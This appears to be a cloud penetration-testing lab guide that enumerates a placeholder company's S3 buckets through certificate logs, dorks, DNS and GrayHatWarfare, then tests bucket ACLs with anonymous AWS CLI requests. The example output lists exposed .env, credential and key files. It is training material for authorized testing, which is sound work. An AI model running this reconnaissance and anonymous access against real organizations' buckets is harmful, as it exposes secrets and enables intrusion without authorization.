Objective: Discover S3 buckets associated with a target domain using passive OSINT — no direct interaction with target infrastructure.
Prerequisites:
  • AWS CLI v2 installed and configured (aws configure)
  • Tools installed: curl, jq, dig, host
  • Target domain name (e.g., targetcorp.com)
  • GrayHatWarfare API key (optional, for Step 4)
  • Authorized scope: confirm the target domain is within your authorized engagement scope
1
Query Certificate Transparency logs via crt.sh to enumerate subdomains that may map to S3 buckets.
Terminal
$ curl -s "https://crt.sh/?q=%.targetcorp.com&output=json" | jq -r '.[].name_value' | sort -u | tee subdomains.txt
assets.targetcorp.com cdn-uploads.targetcorp.com backup-data.targetcorp.com static.targetcorp.com www.targetcorp.com mail.targetcorp.com api.targetcorp.com dev.targetcorp.com
2
Use Google dorks to find S3 buckets indexed by search engines. Run each query in your browser or via a search API.
Terminal
# Google Dork queries — run in browser or automation
site:s3.amazonaws.com "targetcorp" site:s3.amazonaws.com inurl:targetcorp "targetcorp" filetype:xml "ListBucketResult" site:amazonaws.com "targetcorp" ext:env OR ext:sql OR ext:bak inurl:"s3.amazonaws.com" "targetcorp-backup" OR "targetcorp-dev"
# Save discovered bucket names to google.txt
targetcorp-public-assets targetcorp-backup targetcorp-marketing-uploads
3
Perform DNS CNAME lookups on discovered subdomains to identify those pointing directly to S3.
Terminal
$ dig +short CNAME assets.targetcorp.com
assets.targetcorp.com.s3.amazonaws.com.
$ host cdn-uploads.targetcorp.com
cdn-uploads.targetcorp.com is an alias for cdn-uploads.targetcorp.com.s3.amazonaws.com. cdn-uploads.targetcorp.com.s3.amazonaws.com has address 52.217.44.100
$ dig +short CNAME static.targetcorp.com
d3abc123xyz.cloudfront.net.
# Automate across all subdomains
$ while read sub; do echo -n "$sub -> "; dig +short CNAME "$sub"; done < subdomains.txt | grep s3.amazonaws | tee dns.txt
assets.targetcorp.com -> assets.targetcorp.com.s3.amazonaws.com. cdn-uploads.targetcorp.com -> cdn-uploads.targetcorp.com.s3.amazonaws.com. backup-data.targetcorp.com -> backup-data.targetcorp.com.s3.amazonaws.com.
4
Search GrayHatWarfare for publicly indexed buckets matching the target keyword.
Terminal
$ curl -s "https://buckets.grayhatwarfare.com/api/v2/buckets?keyword=targetcorp" \ -H "Authorization: Bearer API_KEY" | jq '.buckets[].bucket'
"targetcorp-public-assets" "targetcorp-backup" "targetcorp-logs-2024" "targetcorp-dev-uploads"
5
Compile and deduplicate all discovered bucket names from every source into a master list.
Terminal
$ cat crtsh.txt google.txt dns.txt ghw.txt | sort -u > all_buckets.txt && wc -l all_buckets.txt
7 all_buckets.txt
$ cat all_buckets.txt
assets.targetcorp.com backup-data.targetcorp.com cdn-uploads.targetcorp.com targetcorp-backup targetcorp-dev-uploads targetcorp-logs-2024 targetcorp-public-assets

Active brute-forcing generates HTTP requests to S3. AWS does not rate-limit these checks aggressively, but be aware that the target cannot see your requests — only AWS can. Objective: Determine the access level of discovered S3 buckets by systematically testing ACL permissions.
Prerequisites:
  • AWS CLI v2 installed and configured (aws configure)
  • Target bucket name identified from Lab 1 or Lab 2 (e.g., targetcorp-backup)
  • Lab environment bucket with ACLs enabled (ACLs are disabled by default on buckets created after April 2023; this lab requires a bucket with ACLs explicitly enabled for the attack simulation)
  • Authorized scope confirmed for the target bucket
1
Before any ACL or anonymous access tests, check whether Block Public Access (BPA) is enabled. If BPA is on, public ACL grants are ignored by S3 and tests will return AccessDenied even for buckets with permissive ACLs.
Terminal
$ aws s3api get-public-access-block --bucket targetcorp-backup
{ "PublicAccessBlockConfiguration": { "BlockPublicAcls": false, "IgnorePublicAcls": false, "BlockPublicPolicy": false, "RestrictPublicBuckets": false } }
# All four values are false — BPA is disabled. ACL-based public access is in effect.
# If BlockPublicAcls=true OR IgnorePublicAcls=true, ACL grants to AllUsers are blocked/ignored.
# If RestrictPublicBuckets=true, even bucket-policy public grants are blocked.
2
Retrieve the bucket ACL to see who has what permissions. Look for grants to AllUsers or AuthenticatedUsers.
Terminal
$ aws s3api get-bucket-acl --bucket targetcorp-backup --no-sign-request
{ "Owner": { "DisplayName": "targetcorp-admin", "ID": "a3bce8f1d2e4..." }, "Grants": [ { "Grantee": { "Type": "CanonicalUser", "ID": "a3bce8f1d2e4..." }, "Permission": "FULL_CONTROL" }, { "Grantee": { "Type": "Group", "URI": "http://acs.amazonaws.com/groups/global/AllUsers" }, "Permission": "FULL_CONTROL" } ] }
3
Test anonymous read access by listing bucket contents without credentials.
Terminal
$ aws s3 ls s3://targetcorp-backup --no-sign-request
PRE config/ PRE uploads/ PRE db-dumps/ 2024-03-15 09:22:31 1247 .env 2024-03-14 18:45:02 34521 database-backup.sql.gz 2024-03-12 11:33:19 8192 credentials.csv 2024-03-10 07:18:55 442 deploy-keys.pem
# Also check read on a specific object
$ aws s3api head-object --bucket targetcorp-backup --key .env --no-sign-request
